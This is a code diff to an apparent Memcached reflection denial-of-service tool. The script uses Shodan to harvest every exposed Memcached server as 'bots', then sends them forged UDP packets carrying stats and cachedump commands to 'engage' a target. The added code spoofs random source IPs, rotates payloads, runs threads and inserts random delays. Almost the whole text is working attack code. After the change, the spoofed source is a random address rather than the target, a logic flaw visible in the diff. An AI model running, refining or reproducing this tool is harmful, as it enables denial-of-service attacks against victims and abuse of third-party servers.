@@ -10,6 +10,8 @@ from pathlib import Path
 from scapy.all import *
 from contextlib import contextmanager, redirect_stdout
 import datetime
+from random import randint, uniform, choice
+from threading import Thread
 
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
@@ -27,6 +29,17 @@ def is_valid_ip(ip):
         return True
     except ValueError:
         return False
+
+def random_ip():
+    return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"
+
+def generate_payload():
+    commands = [
+        "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n",
+        "\x00\x00\x00\x00\x00\x01\x00\x00stats cachedump 1 0\r\n",
+        "\x00\x00\x00\x00\x00\x01\x00\x00get key\r\n"
+    ]
+    return choice(commands)
 
 class Color:
     HEADER = '\033[0m'
@@ -73,13 +86,17 @@ while True:
         if query.startswith('y'):
             print('[~] Checking Shodan.io API Key...')
             try:
-                results = api.search('product:"Memcached" port:11211')
-                print('[✓] API Key Authentication: SUCCESS')
-                print('[~] Number of bots: %s' % results['total'])
+                total_results = api.search('product:"Memcached" port:11211')['total']
+                all_matches = []
+                for page in range(1, (total_results // 100) + 2):
+                    results = api.search('product:"Memcached" port:11211', page=page)
+                    all_matches.extend(results['matches'])
+                print(f'[~] Total bots retrieved: {len(all_matches)}')
+
                 saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
                 if saveresult.startswith('y'):
                     with open('bots.txt', 'w') as file2:
-                        for result in results['matches']:
+                        for result in all_matches:
                             file2.write(result['ip_str'] + "\n")
                     print('[~] File written: ./bots.txt')
             except shodan.APIError as e:
@@ -89,6 +106,7 @@ while True:
         if myresults.is_file() and input('[*] Use locally stored Shodan data? <Y/n>: ').lower().startswith('y'):
             with open('bots.txt') as my_file:
                 ip_array = [line.strip() for line in my_file if is_valid_ip(line.strip())]
+                print(f'[~] Total valid bots after filtering: {len(ip_array)}')
         else:
             ip_array = []
             print('[✘] Error: No valid bots found in bots.txt')
@@ -114,23 +132,35 @@ while True:
             print('[✘] Invalid power value. Exiting...')
             break
 
-        data = input("[+] Enter payload contained inside packet (Default stats): ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-
         engage = input(f'[*] Ready to engage target {target}? <Y/n>: ').lower()
         if not engage.startswith('y'):
             print('[✘] Engagement canceled. Exiting...')
             break
 
         print('[*] Sending packets...')
-        end_time = datetime.datetime.now() + datetime.timedelta(minutes=10)  # Run for 10 minutes
-        while datetime.datetime.now() < end_time:
-            for ip in ip_array:
-                print(f'[+] Sending forged payloads to: {ip}')
-                response = sr1(IP(src=target, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=data), timeout=2, verbose=0)
+
+        def send_payload(ip):
+            src_ip = random_ip()
+            payload = generate_payload()
+            print(f'[+] Sending forged payloads to: {ip} from spoofed IP: {src_ip}')
+            try:
+                response = sr1(IP(src=src_ip, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=payload), timeout=2, verbose=0)
                 if response:
                     print(f'[✓] Response received from {ip}')
                 else:
                     print(f'[!] No response from {ip}')
+            except Exception as e:
+                print(f'[✘] Error while sending to {ip}: {e}')
+            time.sleep(uniform(0.5, 2))  # Introduce random delays
+
+        threads = []
+        for ip in ip_array:
+            t = Thread(target=send_payload, args=(ip,))
+            threads.append(t)
+            t.start()
+
+        for t in threads:
+            t.join()
 
         print('[✓] Task complete! Exiting platform.')
         break
